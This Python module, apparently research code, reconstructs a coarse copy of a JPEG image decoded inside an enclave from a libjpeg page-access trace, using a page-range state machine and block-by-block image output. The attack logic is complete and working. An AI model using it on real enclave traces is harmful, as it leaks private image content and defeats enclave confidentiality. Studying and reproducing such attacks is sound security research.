"""
JPEG image reconstruction attack on a libjpeg page-access trace.

Models libjpeg's decompression loop as a small state machine
(JpegState) driven by the order in which enclave pages are touched.
The number of "data" pages touched between two IDCT phases yields one
integer per 8x8 block, which normalised to [0, 255] reconstructs a
coarse copy of the decoded image.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path


from .model import TraceData
from .parser import load_vcd_trace


class JpegState(Enum):
    """
    Phases of libjpeg's decompression loop, identified from page hits.

    States advance roughly:
      PRE_START -> START -> START_ROW -> IDCT_SLOW -> DATA_COUNT (...)
        -> PRE_IDCT_SLOW -> IDCT_SLOW -> DATA_COUNT (...)
        -> NEXT_ROW -> START_ROW -> ...
    """

    PRE_START = "pre_start"
    START = "start"
    NEXT_ROW = "next_row"
    START_ROW = "start_row"
    PRE_IDCT_SLOW = "pre_idct_slow"
    IDCT_SLOW = "idct_slow"
    DATA_COUNT = "data_count"


@dataclass(frozen=True)
class JpegAttackConfig:
    """
    Page-range configuration for the JPEG state machine.

    Each state is associated with a range of enclave page numbers.
    The state machine advances when an observed page falls in the
    range of one of the allowed next states.
    """

    # Page range for the START state (decompressor entry).
    start_range: range = field(default_factory=lambda: range(54, 55))

    # Page range for the NEXT_ROW state (row advance bookkeeping).
    next_row_range: range = field(default_factory=lambda: range(44, 46))

    # Page range for the START_ROW state (start of an output row).
    start_row_range: range = field(default_factory=lambda: range(58, 59))

    # Page range for the PRE_IDCT_SLOW state (between blocks in a row).
    pre_idct_slow_range: range = field(default_factory=lambda: range(59, 60))

    # Page range for the IDCT_SLOW state (the inverse-DCT itself).
    idct_slow_range: range = field(default_factory=lambda: range(63, 65))

    # Default DATA_COUNT page range used when AEX-notify is disabled.
    data_count_range_no_aexnotify: range = field(default_factory=lambda: range(150, 4340))

    # DATA_COUNT page range used when AEX-notify is enabled.
    data_count_range_aexnotify: range = field(default_factory=lambda: range(150, 4335))

    # Optional explicit page set; overrides data_count_range when set.
    data_count_pages: frozenset[int] | None = None

    # 1 = grayscale reconstruction, 3 = RGB.
    num_colors: int = 1

    # Switches between the two data_count_range_* fields.
    aexnotify: bool = False

    def data_count_range(self) -> range:
        """
        Pick the active DATA_COUNT range based on the aexnotify flag.

        @return the page-number range to treat as DATA_COUNT
        """
        return self.data_count_range_aexnotify if self.aexnotify else self.data_count_range_no_aexnotify

    def pages_for_state(self, state: JpegState) -> range:
        """
        Return the configured page range for a given JpegState.

        @param state the JpegState to look up
        @return the configured range; empty range for PRE_START
        """
        if state == JpegState.START:
            return self.start_range
        if state == JpegState.NEXT_ROW:
            return self.next_row_range
        if state == JpegState.START_ROW:
            return self.start_row_range
        if state == JpegState.PRE_IDCT_SLOW:
            return self.pre_idct_slow_range
        if state == JpegState.IDCT_SLOW:
            return self.idct_slow_range
        if state == JpegState.DATA_COUNT:
            return self.data_count_range()
        return range(0, 0)

    def page_matches_state(self, state: JpegState, page_number: int) -> bool:
        """
        Test whether a page number belongs to the page set of a state.

        For DATA_COUNT, an explicit data_count_pages set takes
        precedence over the contiguous range.

        @param state the candidate state
        @param page_number the observed page number
        @return True when the page belongs to that state's pages
        """
        if state == JpegState.DATA_COUNT and self.data_count_pages is not None:
            return page_number in self.data_count_pages
        return page_number in self.pages_for_state(state)

    def next_states(self, state: JpegState) -> list[JpegState]:
        """
        Return the states that may legally follow the given state.

        @param state the current state
        @return the ordered list of allowed successor states
        """
        if state == JpegState.PRE_START:
            return [JpegState.START]
        if state == JpegState.START:
            return [JpegState.START_ROW]
        if state == JpegState.NEXT_ROW:
            return [JpegState.START_ROW]
        if state == JpegState.START_ROW:
            return [JpegState.IDCT_SLOW]
        if state == JpegState.PRE_IDCT_SLOW:
            return [JpegState.IDCT_SLOW, JpegState.NEXT_ROW]
        if state == JpegState.IDCT_SLOW:
            return [JpegState.DATA_COUNT]
        if state == JpegState.DATA_COUNT:
            return [JpegState.DATA_COUNT, JpegState.PRE_IDCT_SLOW, JpegState.NEXT_ROW]
        return []

    def next_state(self, current: JpegState, page_number: int) -> JpegState:
        """
        Pick the first allowed successor whose page set contains page_number.

        Falls back to the current state when no successor matches.

        @param current the active JpegState
        @param page_number the just-observed page number
        @return the resolved next JpegState
        """
        for candidate in self.next_states(current):
            if self.page_matches_state(candidate, page_number):
                return candidate
        return current


@dataclass
class JpegReconstruction:
    """
    Mutable image being reconstructed block-by-block.

    Stores one matrix per color channel; each cell is the number of
    DATA_COUNT page hits observed for the corresponding 8x8 JPEG block.
    """

    # Number of color channels (1 = grayscale, 3 = RGB).
    num_colors: int = 1

    # Per-channel rows, each row a list of block counts.
    rows: list[list[list[int]]] = field(init=False)

    # Channel that the next reconstruct_block() call will fill.
    current_color: int = 0

    # Index of the current row in every channel.
    current_row: int = 0

    # Smallest block count seen so far (used for normalization).
    min_data: int = field(default=int(1e18))

    # Largest block count seen so far (used for normalization).
    max_data: int = 0

    def __post_init__(self) -> None:
        """
        Initialise rows with one empty row per color channel.
        """
        self.rows = [[[]] for _ in range(self.num_colors)]

    def next_row(self) -> None:
        """
        Open a fresh empty row in every color channel.
        Called when transitioning NEXT_ROW -> START_ROW.
        """
        for color in range(self.num_colors):
            self.rows[color].append([])
        self.current_row += 1

    def reconstruct_block(self, num_data: int) -> None:
        """
        Append one block's data count to the current row of the current channel.

        Updates the running min/max tracker and round-robins to the
        next color channel for RGB reconstruction.

        @param num_data number of DATA_COUNT page hits observed for this block
        """
        self.min_data = min(self.min_data, num_data)
        self.max_data = max(self.max_data, num_data)
        self.rows[self.current_color][self.current_row].append(num_data)
        self.current_color = (self.current_color + 1) % self.num_colors

    def reconstruct_transition(
        self,
        prev_state: JpegState,
        new_state: JpegState,
        data_counter: int,
    ) -> None:
        """
        Bridge the state machine to the image being built.

        Flushes a block when leaving DATA_COUNT, and opens a new row
        when transitioning NEXT_ROW -> START_ROW.

        @param prev_state the state before the transition
        @param new_state the state after the transition
        @param data_counter the value of the data counter at the transition
        """
        if prev_state == JpegState.DATA_COUNT and new_state != JpegState.DATA_COUNT:
            self.reconstruct_block(data_counter)

        if prev_state == JpegState.NEXT_ROW and new_state == JpegState.START_ROW:
            self.next_row()

    def reconstructed_size(self) -> tuple[int, int]:
        """
        @return (width_in_blocks, height_in_blocks) of the reconstruction
        """
        width = 0
        for row in self.rows[0]:
            width = max(width, len(row))
        height = len(self.rows[0]) -1
        return width, height

    def raw_reconstruction(self) -> list[list[list[int]]]:
        """
        @return the raw block counts as a per-channel matrix (no normalization)
        """
        return self.rows

    def _flatten_plane_values(self, color: int = 0) -> list[int]:
        """
        Flatten one color plane into a single list of block counts.

        @param color color channel index
        @return concatenation of every row of that channel
        """
        values: list[int] = []
        for row in self.rows[color]:
            values.extend(row)
        return values

    def _normalization_bounds(
        self,
        color: int = 0,
        low_percentile: float = 0.0,
        high_percentile: float = 100.0,
    ) -> tuple[int, int]:
        """
        Compute the (lo, hi) clipping bounds for one color plane.

        With the default percentiles this returns the absolute min/max;
        narrower percentiles clip outliers before scaling.

        @param color color channel index
        @param low_percentile lower clipping percentile in [0, 100]
        @param high_percentile upper clipping percentile in [0, 100]
        @return (lo, hi) integer bounds with hi > lo guaranteed
        """
        values = self._flatten_plane_values(color)
        if not values:
            return 0, 1

        values.sort()

        if low_percentile <= 0.0 and high_percentile >= 100.0:
            lo = values[0]
            hi = values[-1]
            if hi <= lo:
                hi = lo + 1
            return lo, hi

        n = len(values)
        low_idx = int((low_percentile / 100.0) * (n - 1))
        high_idx = int((high_percentile / 100.0) * (n - 1))

        low_idx = max(0, min(low_idx, n - 1))
        high_idx = max(0, min(high_idx, n - 1))

        lo = values[low_idx]
        hi = values[high_idx]
        if hi <= lo:
            hi = lo + 1
        return lo, hi

    def normalized_plane(
        self,
        color: int = 0,
        low_percentile: float = 0.0,
        high_percentile: float = 100.0,
    ) -> list[list[int]]:
        """
        Return one color channel scaled into 0..255.

        Pads short rows with the lower bound so every output row has
        the same width.

        @param color color channel index
        @param low_percentile lower clipping percentile
        @param high_percentile upper clipping percentile
        @return rectangular matrix of 8-bit values (rows of equal length)
        """
        width, height = self.reconstructed_size()
        if height == 0:
            return []

        min_val, max_val = self._normalization_bounds(
            color=color,
            low_percentile=low_percentile,
            high_percentile=high_percentile,
        )

        scale = 255.0 / (max_val - min_val)

        out: list[list[int]] = []
        for y in range(height):
            src_row = self.rows[color][y] if y < len(self.rows[color]) else []
            dst_row: list[int] = []
            for x in range(width):
                value = src_row[x] if x < len(src_row) else min_val
                clipped = min(max(value, min_val), max_val)
                normalized = int((clipped - min_val) * scale)
                if normalized < 0:
                    normalized = 0
                if normalized > 255:
                    normalized = 255
                dst_row.append(normalized)
            out.append(dst_row)
        return out

    def normalized_rgb(
        self,
        low_percentile: float = 0.0,
        high_percentile: float = 100.0,
    ) -> list[list[tuple[int, int, int]]]:
        """
        Return the reconstruction as an (R, G, B) matrix.

        For grayscale (num_colors == 1) every channel of every pixel is
        the same value. For RGB the three channels are taken from the
        respective planes, padding missing channels with 0.

        @param low_percentile lower clipping percentile
        @param high_percentile upper clipping percentile
        @return rectangular matrix of (r, g, b) tuples
        """
        width, height = self.reconstructed_size()
        if self.num_colors == 1:
            gray = self.normalized_plane(
                0,
                low_percentile=low_percentile,
                high_percentile=high_percentile,
            )
            return [[(v, v, v) for v in row] for row in gray]

        planes = [
            self.normalized_plane(
                i,
                low_percentile=low_percentile,
                high_percentile=high_percentile,
            )
            for i in range(self.num_colors)
        ]
        out: list[list[tuple[int, int, int]]] = []
        for y in range(height):
            row: list[tuple[int, int, int]] = []
            for x in range(width):
                r = planes[0][y][x] if x < len(planes[0][y]) else 0
                g = planes[1][y][x] if self.num_colors > 1 and x < len(planes[1][y]) else 0
                b = planes[2][y][x] if self.num_colors > 2 and x < len(planes[2][y]) else 0
                row.append((r, g, b))
            out.append(row)
        return out

    def save_raw_json(self, path: str | Path) -> None:
        """
        Dump the raw block-count matrix to a JSON file.

        @param path output file path
        """
        Path(path).write_text(json.dumps(self.rows, indent=2), encoding="utf-8")

    def save_pgm(
        self,
        path: str | Path,
        color: int = 0,
        low_percentile: float = 0.0,
        high_percentile: float = 100.0,
    ) -> None:
        """
        Write one channel as a Netpbm P5 (binary grayscale) image.

        @param path output file path
        @param color color channel index to write
        @param low_percentile lower clipping percentile
        @param high_percentile upper clipping percentile
        """
        plane = self.normalized_plane(
            color=color,
            low_percentile=low_percentile,
            high_percentile=high_percentile,
        )
        height = len(plane)
        width = len(plane[0]) if height else 0

        with open(path, "wb") as f:
            f.write(f"P5\n{width} {height}\n255\n".encode("ascii"))
            for row in plane:
                f.write(bytes(row))

    def save_ppm(
        self,
        path: str | Path,
        low_percentile: float = 0.0,
        high_percentile: float = 100.0,
    ) -> None:
        """
        Write the reconstruction as a Netpbm P6 (binary RGB) image.

        @param path output file path
        @param low_percentile lower clipping percentile
        @param high_percentile upper clipping percentile
        """
        rgb = self.normalized_rgb(
            low_percentile=low_percentile,
            high_percentile=high_percentile,
        )
        height = len(rgb)
        width = len(rgb[0]) if height else 0

        with open(path, "wb") as f:
            f.write(f"P6\n{width} {height}\n255\n".encode("ascii"))
            for row in rgb:
                for r, g, b in row:
                    f.write(bytes((r, g, b)))

    def save_png_preview(
        self,
        path: str | Path,
        scale: int = 16,
        block_size: int = 1,
        low_percentile: float = 2.0,
        high_percentile: float = 98.0,
    ) -> None:
        """
        Render a scaled PNG preview using Pillow.

        Each block is painted as block_size x block_size pixels and
        the final image is up-scaled by `scale` using nearest-neighbour.

        @param path output file path (.png)
        @param scale integer up-scaling factor applied at the end
        @param block_size pixel size of each reconstructed JPEG block
        @param low_percentile lower clipping percentile
        @param high_percentile upper clipping percentile
        @raises RuntimeError when Pillow is not installed
        """
        try:
            from PIL import Image
        except ImportError as exc:
            raise RuntimeError(
                "Pillow is niet geïnstalleerd. Doe eerst: pip install pillow"
            ) from exc

        block_size = max(1, int(block_size))
        scale = max(1, int(scale))

        if self.num_colors == 1:
            plane = self.normalized_plane(
                0,
                low_percentile=low_percentile,
                high_percentile=high_percentile,
            )
            height = len(plane)
            width = len(plane[0]) if height else 0

            img = Image.new("L", (max(1, width * block_size), max(1, height * block_size)))
            for y, row in enumerate(plane):
                for x, value in enumerate(row):
                    base_x = x * block_size
                    base_y = y * block_size
                    for dy in range(block_size):
                        for dx in range(block_size):
                            img.putpixel((base_x + dx, base_y + dy), value)
        else:
            rgb = self.normalized_rgb(
                low_percentile=low_percentile,
                high_percentile=high_percentile,
            )
            height = len(rgb)
            width = len(rgb[0]) if height else 0

            img = Image.new("RGB", (max(1, width * block_size), max(1, height * block_size)))
            for y, row in enumerate(rgb):
                for x, value in enumerate(row):
                    base_x = x * block_size
                    base_y = y * block_size
                    for dy in range(block_size):
                        for dx in range(block_size):
                            img.putpixel((base_x + dx, base_y + dy), value)

        if scale > 1 and img.size[0] > 0 and img.size[1] > 0:
            img = img.resize((img.size[0] * scale, img.size[1] * scale), Image.NEAREST)

        img.save(path)

    def to_debug_dict(self) -> dict:
        """
        Return a JSON-friendly snapshot of the reconstruction state.

        @return dict with size, channel count, observed min/max counts,
                and the raw rows matrix
        """
        width, height = self.reconstructed_size()
        return {
            "width_blocks": width,
            "height_blocks": height,
            "num_colors": self.num_colors,
            "min_data": None if self.min_data == int(1e18) else self.min_data,
            "max_data": self.max_data,
            "rows": self.rows,
        }


@dataclass
class JpegAttackResult:
    """
    Result of running a JPEG attack: the config, the reconstruction
    and a few statistics about the run.
    """

    # The configuration that produced this result.
    config: JpegAttackConfig

    # The reconstructed image (mutable; carries the raw block counts).
    reconstruction: JpegReconstruction

    # The state machine state at end-of-trace.
    final_state: JpegState

    # Number of interesting page events processed by the attack.
    processed_pages: int

    @property
    def width(self) -> int:
        """
        @return reconstructed image width in 8x8 blocks
        """
        return self.reconstruction.reconstructed_size()[0]

    @property
    def height(self) -> int:
        """
        @return reconstructed image height in 8x8 blocks
        """
        return self.reconstruction.reconstructed_size()[1]

    def save_image(self, path: str | Path) -> None:
        """
        Save the reconstruction in the format implied by the file suffix.

        .png delegates to save_png_preview with default settings;
        .pgm/.ppm pick the right Netpbm format based on num_colors.

        @param path output file path
        """
        suffix = Path(path).suffix.lower()
        if suffix == ".png":
            self.reconstruction.save_png_preview(
                path,
                scale=1,
                block_size=8,
                low_percentile=2.0,
                high_percentile=98.0,
            )
        elif self.config.num_colors == 1:
            self.reconstruction.save_pgm(path)
        else:
            self.reconstruction.save_ppm(path)

    def save_raw_json(self, path: str | Path) -> None:
        """
        Dump the raw block-count matrix as JSON.

        @param path output file path
        """
        self.reconstruction.save_raw_json(path)

    def save_preview(self, path: str | Path, scale: int = 16) -> None:
        """
        Save a scaled PNG preview using sane defaults.

        @param path output file path (.png)
        @param scale integer up-scaling factor
        """
        self.reconstruction.save_png_preview(
            path,
            scale=scale,
            block_size=8,
            low_percentile=2.0,
            high_percentile=98.0,
        )


def _page_name_to_number(page_name: str) -> int:
    """
    Convert a page signal name to its integer page number.

    Accepts both "_17" and "17".

    @param page_name signal name as it appears in the VCD trace
    @return the integer page index
    """
    if page_name.startswith("_"):
        return int(page_name[1:])
    return int(page_name)


def _iter_v1_page_events(trace: TraceData):
    """
    Iterate every page rising edge in trace order.

    Yields (signal_name, page_number) for every signal whose value
    became "1" at some timestamp. Non-page signals are skipped.

    @param trace the parsed TraceData to iterate
    """
    for _, changes in zip(trace.times, trace.events):
        for signal_name, value in changes.items():
            if value != "1":
                continue
            try:
                page_number = _page_name_to_number(signal_name)
            except ValueError:
                continue
            yield signal_name, page_number


def attack_jpeg_trace(
    trace: TraceData,
    config: JpegAttackConfig | None = None,
) -> JpegAttackResult:
    """
    Run the JPEG reconstruction attack on an already-parsed trace.

    Walks every page rising edge that belongs to one of the configured
    state ranges. The state machine plus the data counter together
    drive JpegReconstruction; on transitions out of DATA_COUNT a block
    is flushed.

    @param trace the parsed TraceData
    @param config the page-range configuration; defaults to JpegAttackConfig()
    @return the attack result, including the reconstructed image
    """
    if config is None:
        config = JpegAttackConfig()

    # Pre-compute the set of pages that can drive a state transition.
    # Pages outside this set never affect the state machine, so we skip them
    # for efficiency and to align with the navigator-driven attack which
    # filters via breakpoints on these same pages.
    interesting_pages: set[int] = set()
    for s in JpegState:
        interesting_pages.update(config.pages_for_state(s))
    if config.data_count_pages:
        interesting_pages.update(config.data_count_pages)

    state = JpegState.PRE_START
    reconstruction = JpegReconstruction(num_colors=config.num_colors)
    data_counter = 0
    processed_pages = 0

    for _, page_number in _iter_v1_page_events(trace):
        if page_number not in interesting_pages:
            continue
        prev_state = state
        new_state = config.next_state(state, page_number)

        if prev_state == JpegState.IDCT_SLOW and new_state == JpegState.DATA_COUNT:
            data_counter = 1
        elif (
            prev_state == JpegState.DATA_COUNT
            and new_state == JpegState.DATA_COUNT
            and config.page_matches_state(JpegState.DATA_COUNT, page_number)
        ):
            # Only increment when the page actually matched the DATA_COUNT
            # range. Without this guard, a page that is in *no* state's range
            # leaves new_state == prev_state == DATA_COUNT and would falsely
            # increment, over-counting blocks 
            data_counter += 1

        reconstruction.reconstruct_transition(prev_state, new_state, data_counter)

        if prev_state == JpegState.DATA_COUNT and new_state != JpegState.DATA_COUNT:
            data_counter = 0

        state = new_state
        processed_pages += 1

    if state == JpegState.DATA_COUNT and data_counter > 0:
        reconstruction.reconstruct_block(data_counter)

    return JpegAttackResult(
        config=config,
        reconstruction=reconstruction,
        final_state=state,
        processed_pages=processed_pages,
    )


def attack_jpeg_vcd(
    trace_path: str | Path,
    config: JpegAttackConfig | None = None,
) -> JpegAttackResult:
    """
    Convenience wrapper: load a VCD file then run attack_jpeg_trace.

    @param trace_path path to the .vcd file
    @param config the page-range configuration; defaults to JpegAttackConfig()
    @return the attack result
    """
    trace = load_vcd_trace(str(trace_path))
    return attack_jpeg_trace(trace, config)


def save_attack_outputs(
    result: JpegAttackResult,
    image_path: str | Path | None = None,
    raw_json_path: str | Path | None = None,
    preview_path: str | Path | None = None,
    preview_scale: int = 16,
) -> None:
    """
    Persist the requested artifacts from a JPEG attack.

    Any path left as None is skipped.

    @param result the JpegAttackResult to write out
    @param image_path optional output path for the reconstructed image
    @param raw_json_path optional output path for the raw block-count JSON
    @param preview_path optional output path for the scaled PNG preview
    @param preview_scale integer up-scaling factor for the preview
    """
    if image_path is not None:
        result.save_image(image_path)
    if raw_json_path is not None:
        result.save_raw_json(raw_json_path)
    if preview_path is not None:
        result.save_preview(preview_path, scale=preview_scale)